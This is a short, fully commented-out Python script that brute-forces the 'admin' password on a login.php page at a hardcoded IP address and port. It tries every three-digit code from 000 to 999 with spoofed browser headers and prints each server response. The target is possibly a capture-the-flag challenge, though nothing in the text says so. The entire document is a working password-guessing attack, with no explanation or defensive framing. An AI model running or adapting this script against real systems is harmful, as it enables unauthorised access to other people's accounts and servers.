# import requests
#
# headers = {
#     'Host': '39.100.83.188:8002',
#     'Cache-Control': 'max-age=0',
#     'Origin': 'http://39.100.83.188:8002',
#     'Upgrade-Insecure-Requests': '1',
#     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
#     'Referer': 'http://39.100.83.188:8002/',
#     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,ja;q=0.6',
# }
#
#
# for i in range(0,10):
#     for j in range(0, 10):
#         for k in range(0, 10):
#             key = str(i) + str(j) + str(k)
#             data = {
#               'username': 'admin',
#               'pwd': key,
#               'Login': 'submit'
#             }
#
#             response = requests.post('http://39.100.83.188:8002/login.php', headers=headers, data=data)
#             print(key,str(response.content,'utf-8'))